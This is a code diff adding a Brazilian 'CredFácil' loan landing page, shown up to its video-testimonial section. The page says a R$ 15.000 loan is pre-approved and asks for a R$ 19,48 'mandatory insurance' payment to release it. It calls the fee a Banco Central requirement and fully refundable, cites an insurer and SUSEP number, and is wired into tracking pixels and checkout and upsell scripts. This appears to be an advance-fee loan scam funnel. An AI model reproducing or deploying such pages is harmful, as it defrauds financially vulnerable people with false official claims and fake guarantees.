@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <link rel="icon" type="image/png" href="/images/favicon-credfacil.png">
+
+    <script src="js/latest-10.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async=""
+        defer=""></script>
+    <script>
+        window.pixelId = "6a3acb84a0439721cfce74e3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <!-- Bullster Pixel -->
+    <script>
+      window.pixelToken = '600f0a9c-c1ff-4e2f-8b18-fa28a712f3cc';
+      (function (d, s) {
+        var js = d.createElement(s);
+        js.src = 'https://cdn.bullster.app/pixel.js';
+        js.async = true;
+        d.head.appendChild(js);
+      })(document, 'script');
+    </script>
+    <script>!function (i, n) { i._plt = i._plt || (n && n.timeOrigin ? n.timeOrigin + n.now() : Date.now()) }(window, performance);</script>
+    <meta charset="UTF-8">
+<!-- FurysMetrics - captura (dashboard CredFácil 3).
+     `_extid`: o MESMO id que o api/pix.js recebe e o webhook devolve - e por ele
+     que a venda casa com a visita. Criado AQUI porque o snippet e `defer` e o
+     JS do site pode rodar antes.
+     `window.fmEvento`: existe desde a primeira linha, entao evento disparado por
+     script SINCRONO (o ViewContent do /up1/) espera o snippet chegar em vez de
+     se perder em silencio. -->
+<script>(function(){try{if(!localStorage.getItem("_extid"))localStorage.setItem("_extid","u_"+Date.now().toString(36)+Math.random().toString(36).slice(2,12));}catch(e){}
+window.fmEvento=function(nome,eventId,valor){var x={pixel:false};if(eventId)x.event_id=eventId;if(valor!=null){x.valor=Number(valor)||0;x.moeda="BRL";}var n=0;(function t(){if(window.fm&&typeof fm.evento==="function"){try{fm.evento(nome,x);}catch(e){}return;}if(++n>50)return;setTimeout(t,200);})();};})();</script>
+<script id="__fm" src="https://fxmalxbvkuzlsyabuwoe.supabase.co/functions/v1/fm"
+        data-ws="016d0860cb0fd49e1a2504bdbbc8ba697fa5" data-uid-de="_extid" data-pixel="off" defer></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Última Etapa — Liberação Imediata | CredFácil</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+    <style>
+    :root{--cream:#f4e9dd;--green:#d2710a;--green-d:#d96e08;--green-dd:#122418;--green-wash:#f6f0e9;--green-line:#e9dccf;--ink:#13291b;--mut:#78736c;--line:#ece3da}
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+    body{font-family:'Plus Jakarta Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:var(--ink);background:linear-gradient(180deg,#f1e4d7 0%,#f7efe6 24%,#fdfaf7 55%,#fff 100%);min-height:100vh;-webkit-font-smoothing:antialiased}
+
+    /* header */
+    .header{position:sticky;top:0;z-index:40;background:rgba(247,239,230,.88);backdrop-filter:blur(10px);border-bottom:1px solid rgba(0,0,0,.05)}
+    .header-content{max-width:480px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:11px 18px}
+    .header-left{display:flex;align-items:center;gap:10px}
+    .menu-icon{width:38px;height:38px;border-radius:11px;background:#fff;border:1px solid var(--line);display:flex;align-items:center;justify-content:center;color:#48423c;cursor:pointer}
+    .menu-icon svg{width:20px;height:20px}
+    .header-left img{height:30px;width:auto}
+    .header-right{display:flex;align-items:center;gap:10px}
+    .user-info{display:flex;flex-direction:column;align-items:flex-end;line-height:1.25}
+    .user-name{font-size:13px;font-weight:800;color:#183222}
+    .user-cpf{font-size:11px;color:var(--mut);font-weight:600}
+    .user-icon-wrapper{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--green-d));display:flex;align-items:center;justify-content:center;color:#fff;flex-shrink:0}
+    .user-icon-wrapper svg{width:20px;height:20px}
+
+    /* layout */
+    .main-container{max-width:480px;margin:0 auto;padding:20px 16px 10px}
+    .container{background:#fff;border-radius:22px;border:1px solid #f0e8df;box-shadow:0 24px 50px -28px rgba(20,41,28,.45),0 4px 16px -10px rgba(0,0,0,.1);padding:22px 18px 24px}
+
+    .status-badge{display:inline-flex;align-items:center;gap:7px;background:var(--green-wash);color:var(--green-d);border:1px solid var(--green-line);font-size:12px;font-weight:800;padding:6px 13px;border-radius:100px}
+    .status-badge svg{width:15px;height:15px}
+    .page-title{font-family:'Sora',sans-serif;font-size:23px;font-weight:800;letter-spacing:-.5px;line-height:1.2;color:#15241b;margin-top:14px}
+    .page-title .highlight{color:var(--green)}
+    .page-subtitle{font-size:14px;color:var(--mut);margin-top:8px;line-height:1.5}
+
+    /* valor aprovado (destaque verde) */
+    .approved-card{background:linear-gradient(135deg,#d96e08,#d2710a);color:#fff;border-radius:18px;padding:20px;text-align:center;margin-top:18px;box-shadow:0 18px 40px -20px rgba(20,41,28,.6)}
+    .approved-label{display:inline-flex;align-items:center;gap:7px;font-size:11.5px;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:#e9dac9}
+    .approved-label svg{width:15px;height:15px}
+    .approved-amount{font-family:'Sora',sans-serif;font-size:36px;font-weight:900;letter-spacing:-1px;line-height:1.05;margin:6px 0 2px}
+    .approved-installments{font-size:13.5px;color:#ecdecf;font-weight:600}
+
+    /* vídeo */
+    .vsl-container{margin-top:18px;border-radius:14px;overflow:hidden;box-shadow:0 14px 30px -18px rgba(20,41,28,.5);background:#162e1f}
+    .vsl-container video{width:100%;aspect-ratio:16/9;display:block;border-radius:14px;object-fit:cover;background:#162e1f}
+
+    /* checklist "falta pouco" */
+    .steps-card{margin-top:16px;background:#fdfcfb;border:1px solid var(--green-line);border-radius:16px;padding:14px 16px}
+    .step-item{display:flex;align-items:center;gap:12px;padding:8px 0;font-size:14px;font-weight:600;color:#433d37}
+    .step-item+.step-item{border-top:1px dashed #efe2d5}
+    .step-ic{width:24px;height:24px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+    .step-ic svg{width:14px;height:14px}
+    .step-item.done .step-ic{background:var(--green);color:#fff}
+    .step-item.done{color:#8a8075}
+    .step-item.pending .step-ic{background:#fff;border:2px solid var(--green);color:var(--green)}
+    .step-item.pending{color:#13291b;font-weight:800}
+    .step-item .dotpulse{width:9px;height:9px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 rgba(210,113,10,.5);animation:dotp 1.6s infinite}
+    @keyframes dotp{0%{box-shadow:0 0 0 0 rgba(210,113,10,.5)}70%{box-shadow:0 0 0 8px rgba(210,113,10,0)}100%{box-shadow:0 0 0 0 rgba(210,113,10,0)}}
+
+    /* 3 cotações do seguro */
+    .quotes{margin-top:18px;display:flex;flex-direction:column;gap:11px}
+    .quotes-head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:2px}
+    .quotes-head h3{font-family:'Sora',sans-serif;font-size:16px;font-weight:800;color:#13291b}
+    .quotes-head span{font-size:11.5px;color:var(--mut);font-weight:600}
+    .quotes-note{font-size:12.5px;color:var(--mut);font-weight:600;line-height:1.45;margin:2px 0 2px}
+    .quotes-note b{color:var(--green-d);font-weight:800}
+    .quote{position:relative;display:flex;align-items:center;gap:13px;background:#fff;border:2px solid #ece3da;border-radius:16px;padding:15px 15px;cursor:pointer;transition:border-color .18s ease,box-shadow .18s ease,background .18s ease}
+    .quote:active{transform:scale(.995)}
+    .quote.sel{border-color:var(--green);background:#fffdfa;box-shadow:0 12px 26px -16px rgba(217,110,8,.55)}
+    .quote-tag-top{position:absolute;top:-9px;left:50px;font-size:9.5px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;color:#fff;background:linear-gradient(135deg,var(--green),var(--green-d));padding:3px 9px;border-radius:100px;box-shadow:0 6px 14px -6px rgba(217,110,8,.7)}
+    .quote-radio{width:23px;height:23px;border-radius:50%;border:2px solid #d8cdc2;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:border-color .18s ease}
+    .quote.sel .quote-radio{border-color:var(--green);background:var(--green)}
+    .quote-radio svg{width:13px;height:13px;color:#fff;opacity:0;transition:opacity .18s ease}
+    .quote.sel .quote-radio svg{opacity:1}
+    .quote-body{flex:1;min-width:0}
+    .q-lbl{font-size:10.5px;font-weight:800;letter-spacing:.6px;text-transform:uppercase;color:var(--mut)}
+    .q-val{font-family:'Sora',sans-serif;font-size:22px;font-weight:900;color:#15241b;letter-spacing:-.7px;line-height:1.05;margin-top:2px}
+    .quote.sel .q-val{color:var(--green-d)}
+    .q-parc{font-size:12px;color:var(--mut);font-weight:600;margin-top:3px}
+    .quote-price{text-align:right;flex-shrink:0;display:flex;flex-direction:column;align-items:flex-end;gap:1px}
+    .quote-price small{font-size:10px;color:var(--mut);font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+    .quote-price b{font-family:'Sora',sans-serif;font-size:16px;font-weight:900;color:#34302c;letter-spacing:-.3px;line-height:1}
+    .quote.sel .quote-price b{color:var(--green-d)}
+    .quote-summary{margin-top:4px;padding:13px 16px;background:var(--green-wash);border:1px solid var(--green-line);border-radius:14px}
+    .qs-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0}
+    .qs-row .l{font-size:13px;color:#544d45;font-weight:700}
+    .qs-row .v{font-family:'Sora',sans-serif;font-size:15px;font-weight:800;color:#34302c}
+    .qs-row.big{border-top:1px dashed #d9c9b8;margin-top:3px;padding-top:9px}
+    .qs-row.big .l{font-weight:800;color:#13291b}
+    .qs-row.big .v{font-size:22px;font-weight:900;color:var(--green-d)}
+
+    /* seção de depoimentos em vídeo */
+    .depo-section{background:linear-gradient(180deg,#fff 0%,#faf4ee 100%);border-top:1px solid #efe2d5;margin-top:26px;padding:30px 16px 8px}
+    .depo-inner{max-width:480px;margin:0 auto}
+    .depo-brand{display:flex;align-items:center;justify-content:center;gap:9px;margin-bottom:14px}
+    .depo-brand img{height:26px;width:auto}
+    .depo-brand span{font-size:11px;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:var(--green-d)}
+    .depo-title{font-family:'Sora',sans-serif;font-size:21px;font-weight:800;text-align:center;color:#15241b;letter-spacing:-.4px;line-height:1.2}
+    .depo-title b{color:var(--green)}
+    .depo-sub{text-align:center;font-size:13px;color:var(--mut);margin-top:7px;line-height:1.5;font-weight:600}
+    .depo-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:20px}
+    .depo-card{position:relative;border-radius:16px;overflow:hidden;background:#000;aspect-ratio:9/16;box-shadow:0 14px 30px -18px rgba(20,41,28,.6);cursor:pointer}
+    .depo-card video{width:100%;height:100%;object-fit:cover;display:block;background:#000}
+    .depo-card .depo-play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,rgba(0,0,0,.05),rgba(0,0,0,.35));transition:opacity .25s ease;z-index:2}
+    .depo-card.playing .depo-play{opacity:0;pointer-events:none}
+    .depo-play .pbtn{width:52px;height:52px;border-radius:50%;background:rgba(255,255,255,.92);display:flex;align-items:center;justify-content:center;box-shadow:0 8px 20px rgba(0,0,0,.4)}
+    .depo-play .pbtn svg{width:22px;height:22px;color:var(--green-d);margin-left:2px}
+    .depo-logo-badge{position:absolute;top:8px;left:8px;z-index:3;background:rgba(255,255,255,.92);border-radius:8px;padding:3px 7px;display:flex;align-items:center;box-shadow:0 4px 10px rgba(0,0,0,.25)}
+    .depo-logo-badge img{height:13px;width:auto;display:block}
+    .depo-mute{position:absolute;bottom:8px;right:8px;z-index:3;width:32px;height:32px;border-radius:50%;border:0;background:rgba(0,0,0,.55);color:#fff;display:none;align-items:center;justify-content:center;cursor:pointer}
+    .depo-card.playing .depo-mute{display:flex}
+    .depo-mute svg{width:16px;height:16px}
+    .depo-trust{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;font-size:12.5px;color:#544d45;font-weight:600}
+    .depo-trust svg{width:16px;height:16px;color:var(--green);flex-shrink:0}
+    .depo-stars{color:#e07a0c;letter-spacing:2px}
+
+    /* seguro */
+    .insurance-section{background:#fdfcfb;border:1px solid var(--green-line);border-radius:16px;padding:16px;margin-top:18px}
+    .insurance-header{display:flex;align-items:center;gap:12px;margin-bottom:6px}
+    .insurance-icon-box{width:46px;height:46px;border-radius:13px;background:linear-gradient(135deg,var(--green),var(--green-d));color:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 8px 16px -8px rgba(128,76,21,.6)}
+    .insurance-icon-box svg{width:24px;height:24px}
+    .insurance-title{font-family:'Sora',sans-serif;font-size:16.5px;font-weight:800;color:#13291b}
+    .insurance-subtitle{font-size:12.5px;color:var(--mut);margin-top:2px;font-weight:600}
+    .insurance-features{list-style:none;margin-top:12px;display:flex;flex-direction:column;gap:11px}
+    .insurance-features li{display:flex;align-items:flex-start;gap:11px;font-size:13px;font-weight:500;color:#544d45;line-height:1.5}
+    .insurance-features li b{color:#13291b;font-weight:800}
+    .feature-check{width:22px;height:22px;border-radius:50%;background:var(--green);color:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    .feature-check svg{width:13px;height:13px}
+
+    /* seguradora parceira */
+    .insurer-strip{display:flex;align-items:center;gap:11px;margin-top:15px;padding:11px 13px;background:#faf6f2;border:1px solid #ece1d6;border-radius:12px}
+    .insurer-strip svg{width:22px;height:22px;flex-shrink:0;color:var(--green-d)}
+    .insurer-info{line-height:1.4}
+    .insurer-name{font-size:12.5px;color:#302b26;font-weight:600}
+    .insurer-name strong{font-weight:800;color:#13291b}
+    .insurer-meta{font-size:11px;color:var(--mut);margin-top:1px}
+
+    /* preços */
+    .pricing-card{background:#fff;border:1px solid var(--line);border-radius:16px;padding:6px 16px;margin-top:16px}
+    .pricing-row{display:flex;justify-content:space-between;align-items:center;padding:13px 0;border-bottom:1px solid #f4f3f1}
+    .pricing-label{font-size:13.5px;color:var(--mut);font-weight:600}
+    .pricing-value{font-size:14px;font-weight:700;color:#34302c}
+    .pricing-row.total{border-bottom:0;padding:15px 0}
+    .pricing-row.total .pricing-label{font-family:'Sora',sans-serif;font-size:16px;font-weight:800;color:#13291b}
+    .pricing-row.total .pricing-value{font-family:'Sora',sans-serif;font-size:20px;font-weight:900;color:var(--green-d)}
+
+    /* CTA */
+    .cta-button{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;border:0;cursor:pointer;background:linear-gradient(135deg,var(--green),var(--green-d));color:#fff;font-family:'Sora',sans-serif;font-weight:800;font-size:16.5px;padding:17px;border-radius:15px;margin-top:18px;box-shadow:0 16px 32px -12px rgba(128,76,21,.7);animation:breathe 2.6s ease-in-out infinite;line-height:1.2}
+    @keyframes breathe{0%,100%{box-shadow:0 12px 26px -14px rgba(128,76,21,.55)}50%{box-shadow:0 18px 36px -10px rgba(128,76,21,.85)}}
+    .cta-button:active{transform:scale(.985)}
+    .cta-button:disabled{opacity:.9;animation:none}
+    .cta-button svg{width:22px;height:22px;flex-shrink:0}
+    .spinner{width:20px;height:20px;border:2.5px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .trust-bar{display:flex;align-items:center;justify-content:center;gap:9px;background:var(--green-wash);border:1px solid var(--green-line);border-radius:13px;padding:12px 14px;margin-top:14px;font-size:12.5px;color:#544d45;font-weight:600}
+    .trust-bar svg{width:17px;height:17px;color:var(--green);flex-shrink:0}
+    .info-text{font-size:12px;color:#a19c96;text-align:center;line-height:1.6;margin-top:16px;padding:0 6px}
+
+    /* modal */
+    .modal-overlay{position:fixed;inset:0;z-index:1000;background:rgba(20,41,28,.55);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;padding:24px}
+    .modal-overlay.show{display:flex}
+    .modal-content{background:#fff;border-radius:22px;padding:28px 24px;max-width:380px;width:100%;text-align:center;box-shadow:0 30px 60px -20px rgba(20,41,28,.6);animation:pop .4s cubic-bezier(.2,.7,.2,1.4) both}
+    @keyframes pop{0%{transform:scale(.85);opacity:0}100%{transform:scale(1);opacity:1}}
+    .modal-icon{width:70px;height:70px;border-radius:50%;background:var(--green-wash);border:2px solid var(--green-line);color:var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+    .modal-icon svg{width:36px;height:36px}
+    .modal-title{font-family:'Sora',sans-serif;font-size:21px;font-weight:800;color:#15241b}
+    .modal-message{font-size:14px;color:var(--mut);line-height:1.6;margin-top:10px}
+    .modal-highlight{color:var(--green-d);font-weight:800}
+    .modal-button{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;border:0;cursor:pointer;background:linear-gradient(135deg,var(--green),var(--green-d));color:#fff;font-family:'Sora',sans-serif;font-weight:800;font-size:15.5px;padding:15px;border-radius:14px;margin-top:20px;box-shadow:0 14px 28px -12px rgba(128,76,21,.7)}
+    .modal-button svg{width:18px;height:18px}
+
+    /* rodapé */
+    .site-footer{background:var(--green-dd);margin-top:26px;padding:26px 22px}
+    .footer-inner{max-width:480px;margin:0 auto;text-align:center}
+    .footer-logo img{height:24px;width:auto;opacity:.98}
+    .site-footer small{display:block;font-size:11px;color:#afa9a2;line-height:1.7;margin-top:12px}
+    .site-footer small strong{color:#ecdecf}
+    </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1697296481759432');fbq('init','2057805311542760');
+window.__fbQ=window.__fbQ||[];(function(){var i='pv_'+Date.now()+'_'+Math.random().toString(36).slice(2,10);fbq('track','PageView',{},{eventID:i});window.__fbQ.push(['PageView',i,null]);})();
+(function(){var c=new URLSearchParams(location.search).get('fbclid');if(c)sessionStorage.setItem('_fbclid',c);})();
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1697296481759432&ev=PageView&noscript=1"/><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2057805311542760&ev=PageView&noscript=1"/></noscript>
+<!-- End Meta Pixel Code -->
+    <script src="js/funnel-config.js"></script>
+    <script src="js/checkout-shared.js" defer></script>
+    <script src="js/upsells-shared.js" defer></script>
+<script src="/js/fb-capi-front.js" defer></script>
+</head>
+
+<body>
+    <header class="header">
+  <link rel="icon" type="image/png" href="/images/favicon-credfacil.png">
+
+        <div class="header-content">
+            <div class="header-left">
+                <div class="menu-icon">
+                    <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+                    </svg>
+                </div>
+                <img src="images/credfacil-logo.png" alt="CredFácil" style="height:34px;width:auto;">
+            </div>
+            <div class="header-right">
+                <div class="user-info">
+                    <span class="user-name" id="userName">Usuário</span>
+                    <span class="user-cpf" id="userCpf">***.***.***-**</span>
+                </div>
+                <div class="user-icon-wrapper">
+                    <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="container">
+            <div class="status-badge">
+                <svg fill="none" stroke="currentColor" stroke-width="2.5" viewbox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round"
+                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                Crédito Pré-Aprovado
+            </div>
+
+            <h1 class="page-title">
+                Seu empréstimo está <span class="highlight">quase liberado.</span>
+            </h1>
+            <p class="page-subtitle">Para liberar o Pix na sua conta, falta apenas contratar o <strong style="color:#34302c">seguro obrigatório do crédito</strong>.</p>
+
+            <div class="approved-card">
+                <div class="approved-label">
+                    <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round"
+                            d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
+                        </path>
+                    </svg>
+                    Valor Aprovado
+                </div>
+                <div class="approved-amount" id="approvedAmount">R$ 15.000,00</div>
+                <div class="approved-installments" id="installmentsText">24x de R$ 750,00</div>
+            </div>
+
+            <div class="steps-card">
+                <div class="step-item done">
+                    <span class="step-ic"><svg fill="none" stroke="currentColor" stroke-width="3" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></span>
+                    Empréstimo aprovado
+                </div>
+                <div class="step-item done">
+                    <span class="step-ic"><svg fill="none" stroke="currentColor" stroke-width="3" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></span>
+                    Conta digital CredFácil criada
+                </div>
+                <div class="step-item pending">
+                    <span class="step-ic"><span class="dotpulse"></span></span>
+                    Contratar o seguro do crédito
+                </div>
+            </div>
+
+            <!-- VSL Video (arquivo do Kauã) -->
+            <div class="vsl-container" id="vslContainer">
+                <video id="vslVideo" src="videos/vsl-nova.mp4" poster="videos/vsl-nova-poster.jpg"
+                    controls playsinline preload="metadata"></video>
+            </div>
+
+            <div class="insurance-section">
+                <div class="insurance-header">
+                    <div class="insurance-icon-box">
+                        <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round"
+                                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+                            </path>
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="insurance-title">Por que o seguro é necessário</div>
+                        <div class="insurance-subtitle">Obrigatório para liberar o crédito via Pix</div>
+                    </div>
+                </div>
+
+                <p style="font-size:13px;line-height:1.6;color:#544d45;font-weight:500;margin:10px 2px 4px">
+                    Seu crédito foi aprovado <strong>sem garantia, sem fiador e sem consulta a restrições</strong>. O seguro é o que protege você, a sua família e a operação — e é o que permite a liberação imediata do valor na sua conta.
+                </p>
+
+                <ul class="insurance-features">
+                    <li>
+                        <span class="feature-check">
+                            <svg fill="none" stroke="currentColor" stroke-width="3" viewbox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                        </span>
+                        <span><b>Proteção em caso de morte ou invalidez.</b> Sua família nunca herda a dívida — o saldo é quitado pelo seguro.</span>
+                    </li>
+                    <li>
+                        <span class="feature-check">
+                            <svg fill="none" stroke="currentColor" stroke-width="3" viewbox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                        </span>
+                        <span><b>Liberação imediata via Pix.</b> Assim que o seguro é pago, o valor cai na sua conta na hora, sem nova análise.</span>
+                    </li>
+                    <li>
+                        <span class="feature-check">
+                            <svg fill="none" stroke="currentColor" stroke-width="3" viewbox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                        </span>
+                        <span><b>100% reembolsável após a quitação.</b> Quitou o empréstimo? O valor do seguro volta integralmente para você.</span>
+                    </li>
+                    <li>
+                        <span class="feature-check">
+                            <svg fill="none" stroke="currentColor" stroke-width="3" viewbox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                        </span>
+                        <span><b>Exigência do Banco Central.</b> Como o crédito é liberado sem garantia, o seguro é o que cobre o risco da operação.</span>
+                    </li>
+                </ul>
+
+                <div style="display:flex;align-items:flex-start;gap:10px;margin-top:14px;padding:12px 13px;background:var(--green-wash);border:1px solid var(--green-line);border-radius:12px">
+                    <svg style="width:18px;height:18px;color:var(--green-d);flex-shrink:0;margin-top:1px" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <span style="font-size:12.5px;line-height:1.55;color:#433d37;font-weight:600"><strong style="color:#13291b">Reembolso garantido:</strong> ao pagar a última parcela, o valor integral do seguro é devolvido na sua conta CredFácil em até 5 dias úteis.</span>
+                </div>
+
+                <div class="insurer-strip">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round"
+                            d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+                        </path>
+                    </svg>
+                    <div class="insurer-info">
+                        <div class="insurer-name">Segurado por <strong>Prev&amp;Seguros Cia. de Seguros S.A.</strong></div>
+                        <div class="insurer-meta">Apólice nº 2024.55.0031287 · Processo SUSEP 15414.901234/2024-71</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pricing-card">
+                <div class="pricing-row">
+                    <span class="pricing-label">Cobertura básica</span>
+                    <span class="pricing-value">R$ 10,32</span>
+                </div>
+                <div class="pricing-row">
+                    <span class="pricing-label">Garantia seguradora</span>
+                    <span class="pricing-value">R$ 5,23</span>
+                </div>
+                <div class="pricing-row">
+                    <span class="pricing-label">Certificado digital</span>
+                    <span class="pricing-value">R$ 3,93</span>
+                </div>
+                <div class="pricing-row total">
+                    <span class="pricing-label">Valor Total</span>
+                    <span class="pricing-value">R$ 19,48</span>
+                </div>
+            </div>
+
+            <button class="cta-button" id="ctaButton" onclick="handleCTA()">
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round"
+                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+                    </path>
+                </svg>
+                <span>Contratar Seguro e Liberar Crédito</span>
+            </button>
+
+            <div class="trust-bar">
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round"
+                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+                    </path>
+                </svg>
+                <span>Ambiente seguro e criptografado</span>
+            </div>
+
+            <p class="info-text">
+                Após a confirmação do pagamento, o valor será liberado automaticamente via PIX em até 10 minutos.
+            </p>
+        </div>
+    </div>
+
+    <!-- DEPOIMENTOS EM VÍDEO (clientes reais) -->
+    <section class="depo-section">
+        <div class="depo-inner">
+            <div class="depo-brand">
+                <img src="images/credfacil-logo.png" alt="CredFácil">
+                <span>Clientes CredFácil</span>
+            </div>
+            <h2 class="depo-title">Quem contratou, <b>recebeu.</b></h2>
+            <p class="depo-sub">Veja quem já pagou o seguro e recebeu o crédito na conta.</p>
+
+            <div class="depo-grid" id="depoGrid">
+                <div class="depo-card" data-src="videos/depoimentos/dep9-1.mp4" onclick="playDepo(this)">
+                    <div class="depo-logo-badge"><img src="images/credfacil-logo.png" alt="CredFácil"></div>
+                    <video src="videos/depoimentos/dep9-1.mp4" poster="videos/depoimentos/dep9-1.jpg" playsinline preload="none"></video>
+                    <div class="depo-play"><span class="pbtn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg></span></div>
+                    <button class="depo-mute" onclick="toggleMute(event, this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5L6 9H2v6h4l5 4V5z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M15.5 8.5a5 5 0 010 7M19.5 5a9 9 0 010 14"></path></svg></button>
+                </div>
+                <div class="depo-card" data-src="videos/depoimentos/dep9-2.mp4" onclick="playDepo(this)">
+                    <div class="depo-logo-badge"><img src="images/credfacil-logo.png" alt="CredFácil"></div>
+                    <video src="videos/depoimentos/dep9-2.mp4" poster="videos/depoimentos/dep9-2.jpg" playsinline preload="none"></video>
+                    <div class="depo-play"><span class="pbtn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg></span></div>
